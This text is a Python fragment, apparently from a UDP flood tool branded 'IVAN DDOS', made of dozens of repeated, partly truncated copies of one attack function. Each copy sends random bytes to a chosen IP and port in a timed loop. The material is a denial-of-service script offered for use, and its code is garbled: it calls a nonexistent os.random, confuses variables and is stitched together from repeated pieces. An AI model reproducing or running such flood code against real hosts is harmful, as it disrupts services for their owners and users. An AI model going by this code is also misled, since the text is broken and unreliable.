    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(9109105678910910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(9109105678910910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)
    
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(9109105678910910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(9109105678910910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(9109105678910910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(9109105678910910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[91m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[91m Tamat')
    os.system("clear")
   
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[91m Tamat')
    os.system("clear")
 
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS ★★★★")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[91m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[91m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[91m Tamat')
    os.system("clear")
   
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[91m Tamat')
    os.system("clear")
 
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS ★★★★")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[91m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[91m Tamat')
    os.system("clear")
 
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS ★★★★")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[91m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(9109105678910910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)
    
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(9109105678910910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(9109105678910910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(9109105678910910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(9109105678910910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(9109105678910910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)
    
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(9109105678910910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(9109105678910910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(9109105678910910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(9109105678910910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[91m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[91m Tamat')
    os.system("clear")
   
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[91m Tamat')
    os.system("clear")
 
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS ★★★★")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[91m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[91m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[91m Tamat')
    os.system("clear")
   
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[91m Tamat')
    os.system("clear")
 
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS ★★★★")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[91m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[91m Tamat')
    os.system("clear")
 
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS ★★★★")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[91m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(9109105678910910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)
    
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(9109105678910910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
